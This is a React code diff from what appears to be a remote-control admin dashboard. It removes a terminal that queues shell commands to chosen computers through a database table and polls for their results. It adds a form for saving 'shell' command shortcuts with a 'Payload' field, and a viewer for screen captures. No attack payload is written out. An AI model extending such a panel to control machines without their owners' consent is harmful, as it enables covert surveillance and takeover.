-                 {terminalOutput.map((l, i) => <div key={i} className="text-gray-400 break-all">{l}</div>)}
-                 <div className="flex gap-3 text-red-500 font-black">
-                    <span>ADMIN@KERCHAK:&gt;</span>
-                    <input autoFocus className="bg-transparent border-none outline-none flex-1 text-white" value={terminalInput} onChange={e=>setTerminalInput(e.target.value)} onKeyDown={async e => {
-                      if(e.key === 'Enter' && terminalInput) {
-                        const cmd = terminalInput;
-                        setTerminalOutput(prev => [...prev, `ADMIN@KERCHAK:> ${cmd}`]);
-                        setTerminalInput("");
-                        const pc = computers.find(c => c.pc_name === activePC);
-                        if(pc) {
-                          const { data } = await supabase.from('commands').insert({ computer_id: pc.id, command: 'cmd', args: cmd, status: 'pending' }).select().single();
-                          if(data) {
-                            const interval = setInterval(async () => {
-                              const { data: r } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
-                              if(r?.status === 'executed' && r.result) { setTerminalOutput(p => [...p, r.result, ""]); clearInterval(interval); }
-                            }, 1000);
-                            setTimeout(()=>clearInterval(interval), 30000);
-                          }
-                        }
-                      }
-                    }} />
+              <div className="grid grid-cols-2 gap-6">
+                 <div>
+                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block ml-1">Type</label>
+                    <div className="bg-black border border-white/10 rounded-2xl px-5 py-4 flex items-center gap-3 focus-within:border-primary transition-all">
+                       <Zap size={16} className="text-gray-700" />
+                       <input type="text" id="s_cmd" placeholder="shell, ls..." className="w-full bg-transparent text-sm font-bold focus:outline-none text-white" />
+                    </div>
                  </div>
-                 <div ref={terminalEndRef} />
+                 <div>
+                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block ml-1">Payload</label>
+                    <div className="bg-black border border-white/10 rounded-2xl px-5 py-4 flex items-center gap-3 focus-within:border-primary transition-all">
+                       <Database size={16} className="text-gray-700" />
+                       <input type="text" id="s_args" placeholder="Arguments..." className="w-full bg-transparent text-sm font-bold focus:outline-none text-white" />
+                    </div>
+                 </div>
               </div>
+              <div className="flex gap-4 mt-6">
+                 <button onClick={() => setIsAddingShortcut(false)} className="flex-1 py-4 bg-white/5 hover:bg-white/10 rounded-2xl text-[10px] font-black uppercase text-gray-500 transition-all">Cancel</button>
+                 <button 
+                   onClick={async () => {
+                     const n = (document.getElementById('s_name') as any).value;
+                     const c = (document.getElementById('s_cmd') as any).value;
+                     const a = (document.getElementById('s_args') as any).value;
+                     if (n && c) {
+                       await supabase.from('saved_commands').insert({ name: n, command: c, args: a });
+                       fetchShortcuts();
+                       setIsAddingShortcut(false);
+                     }
+                   }}
+                   className="flex-[2] bg-primary hover:bg-primary/80 text-white font-black py-4 rounded-2xl shadow-2xl transition-all active:scale-95"
+                 >
+                   AUTHORIZE & SAVE
+                 </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+      {/* FULLSCREEN ZOOM OVERLAY */}
+      {zoomedMedia && (
+        <div className="fixed inset-0 z-[5000] flex items-center justify-center p-10 animate-in fade-in duration-300">
+           <div className="absolute inset-0 bg-black/95 backdrop-blur-3xl" onClick={() => setZoomedMedia(null)}></div>
+           <div className="relative z-10 w-full h-full flex items-center justify-center group">
+              <img src={zoomedMedia} alt="Zoomed Capture" className="max-w-full max-h-full object-contain shadow-[0_0_100px_rgba(0,0,0,0.8)] rounded-2xl" />
+              <button onClick={() => setZoomedMedia(null)} className="absolute top-0 right-0 p-4 text-white opacity-0 group-hover:opacity-100 transition-opacity bg-black/20 hover:bg-red-600 rounded-bl-3xl rounded-tr-2xl"><X size={40} /></button>
            </div>
         </div>
       )}
